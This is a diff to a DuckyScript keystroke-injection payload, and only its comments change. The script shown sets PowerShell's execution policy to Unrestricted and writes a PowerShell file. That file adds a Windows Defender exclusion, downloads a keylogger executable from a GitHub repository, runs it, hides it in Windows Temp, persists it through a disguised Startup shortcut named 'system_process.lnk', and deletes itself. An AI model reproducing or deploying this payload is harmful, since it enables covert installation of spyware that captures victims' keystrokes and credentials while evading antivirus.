@@ -13,7 +13,7 @@ DELAY 100
 ENTER
 DELAY 500
 
-REM Create src file which stores URL and LINES
+REM Make sure we can execute the ps1 file
 STRINGLN Set-ExecutionPolicy -ExecutionPolicy Unrestricted
 DELAY 500
 STRINGLN A
@@ -36,7 +36,7 @@ REM Create src file which stores URL and LINES
 STRINGLN mkdir "%USERPROFILE%\Source" 2>nul & (echo #URL && echo #LINES) > "%USERPROFILE%\Source\src"
 DELAY 500
 
-REM Download the .ps1 file
+REM Create the .ps1 file
 STRINGLN mkdir "%USERPROFILE%\Source" 2>nul & (echo mkdir "$env:windir\temp\Cache" & echo Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force' & echo Invoke-WebRequest -Uri "https://github.com/wishtag/keylogger/raw/refs/heads/main/dist/main.exe" -OutFile "$env:windir\temp\Cache\main.exe" & echo Start-Process "$env:windir\temp\Cache\main.exe" & echo $s=^(New-Object -COM WScript.Shell^).CreateShortcut^("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\system_process.lnk"^);$s.TargetPath="$env:windir\temp\Cache\main.exe";$s.Save^(^) & echo Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force & echo EXIT) > "%USERPROFILE%\Source\dl.ps1"
 DELAY 500
 
